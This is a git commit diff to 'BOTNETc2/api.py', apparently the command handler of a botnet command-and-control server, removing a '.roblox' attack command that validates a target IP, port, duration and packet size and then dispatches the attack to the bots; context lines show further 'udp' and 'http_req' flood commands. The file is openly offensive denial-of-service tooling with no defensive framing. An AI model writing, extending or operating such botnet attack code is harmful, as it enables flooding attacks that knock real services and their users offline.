953fd307b52373409a02ba7912ea44768564a612
HaxTermux <93824226+Hex1629@users.noreply.github.com>
2023-02-11 17:50:44 +0700

    Update api.py

--- BOTNETc2/api.py
+++ BOTNETc2/api.py
@@ -73,33 +73,6 @@ def udp(args, validate_ip, validate_port, validate_time, validate_size, send, cl
     else:
         send(client, 'Usage: .udp [IP] [PORT] [TIME] [SIZE]')
 
-def roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data):
-    if len(args) == 6:
-        ip = args[1]
-        port = args[2]
-        secs = args[3]
-        size = args[4]
-        if validate_ip(ip):
-            if validate_port(port):
-                if validate_time(secs):
-                    if validate_size(size):
-                        send(client, ansi_clear, False)
-                        attack_sent2(ip, port, secs, size, client)
-                        broadcast(data)
-                    else:
-                        send(client, Fore.RED + 'Invalid packet size (0-999999999999 bytes)')
-                else:
-                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
-            else:
-                send(client, Fore.RED + 'Invalid port number (1-65535)')
-        else:
-            send(client, Fore.RED + 'Invalid IP-address')
-    else:
-        send(client, 'Usage: .roblox [IP] [PORT] [TIME] [SIZE] [MODE]')
-        send(client, 'MODE --> RE_SLOW # make bytes data before')
-        send(client, '                   and after not re-bytes if not end send 2500 packet')
-        send(client, '          RE_NOW # if send 6 packet  end and rebytes for next send packet')
-
 def http_req(args, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
     if len(args) == 4:
         ip = args[1]
